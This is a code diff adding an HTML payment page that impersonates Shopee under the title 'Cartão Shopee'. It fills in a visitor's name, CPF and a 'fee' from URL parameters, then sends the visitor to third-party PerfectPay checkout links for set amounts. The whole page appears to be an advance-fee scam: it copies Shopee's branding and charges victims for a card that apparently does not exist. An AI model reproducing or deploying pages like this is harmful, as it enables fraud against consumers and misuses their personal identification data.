@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
+    <title>Cartão Shopee - Pagamento</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px solid #ee4d2d;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .main-content {
+            max-width: 500px;
+            background: #fff;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 90%;
+        }
+
+        .main-content h1 {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .main-content h2 {
+            font-size: 0.95rem;
+            font-weight: normal;
+            color: gray;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .info-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 10px 15px;
+            margin-bottom: 15px;
+            background-color: #f9f9f9;
+        }
+
+        .info-box img {
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
+            filter: brightness(0);
+        }
+
+        .info-box p {
+            font-size: 0.9rem;
+            color: #444;
+            margin: 0;
+        }
+
+        .btn-custom {
+            background-color: #ee4d2d;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 0.95rem;
+            text-align: center;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        @media (max-width: 600px) {
+            .main-content {
+                margin: 30px auto;
+                padding: 20px;
+            }
+
+            .btn-custom {
+                font-size: 1rem;
+                padding: 14px;
+            }
+
+            .footer {
+                font-size: 9px;
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img src="images/shopee-logo.png" alt="YES Card">
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div id="headerc">
+            <div style="margin-bottom: 15px;">
+                <h3 style="color: #000; font-size: 1.2rem;">Confirme seus dados</h3>
+                <div style="border-top: 2px solid #ee4d2d; margin-top: 5px; margin-bottom: 25px;"></div>
+            </div>
+            <div class="details" style="line-height: 1.6;">
+                <p><strong>Nome:</strong> <span id="userName">Carregando...</span></p>
+                <p><strong>CPF:</strong> <span id="userCPF">Carregando...</span></p>
+                <p><strong>Taxa:</strong> <span id="userValue">Carregando...</span></p>
+            </div>
+            <div class="text-center">
+                <button id="gerar-pagamento" class="btn-custom">
+                    Gerar pagamento
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright 2025 Shopee. Todos os direitos reservados.<br>
+        Política de Privacidade | Termos de Uso | Vendas e Reembolsos | Legal | Mapa do Site
+    </div>
+
+    <script>
+        // Funções auxiliares
+        function formatCPF(cpf) {
+            cpf = cpf.replace(/[^0-9]/g, '');
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        function formatCurrency(value) {
+            return 'R$ ' + (value / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        // Função para obter parâmetros da URL
+        function getURLParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name) || 'Não informado';
+        }
+
+        // Obter e sanitizar parâmetros
+        const nome = getURLParameter('nome');
+        const cpf = getURLParameter('cpf');
+        const value = parseInt(getURLParameter('value')) || 0;
+
+        // Formatar dados
+        const cpfFormatado = formatCPF(cpf);
+        const valorFormatado = formatCurrency(value);
+
+        // Preencher os dados na página
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('userName').textContent = nome;
+            document.getElementById('userCPF').textContent = cpfFormatado;
+            document.getElementById('userValue').textContent = valorFormatado;
+
+            // Manipular clique no botão
+            document.getElementById('gerar-pagamento').addEventListener('click', function() {
+                // Substituição do funcionamento do formulário
+                const priceInReais = (value / 100).toFixed(2);
+                let redirectUrl;
+
+                switch (priceInReais) {
+                    case '34.90':
+                        redirectUrl = 'https://go.perfectpay.com.br/PPU38CPO604';
+                        break;
+                    case '29.58':
+                        redirectUrl = 'https://go.perfectpay.com.br/PPU38CPO607';
+                        break;
+                    case '27.97':
+                        redirectUrl = 'https://go.perfectpay.com.br/PPU38CPO625';
+                        break;
+                    default:
+                        // Em caso de valor não reconhecido, redireciona para a página inicial
+                        redirectUrl = '../index.html';
+                }
+
+                // Redirecionar para a URL apropriada
+                window.location.href = redirectUrl;
+            });
+        });
+    </script>
+</body>
+</html>
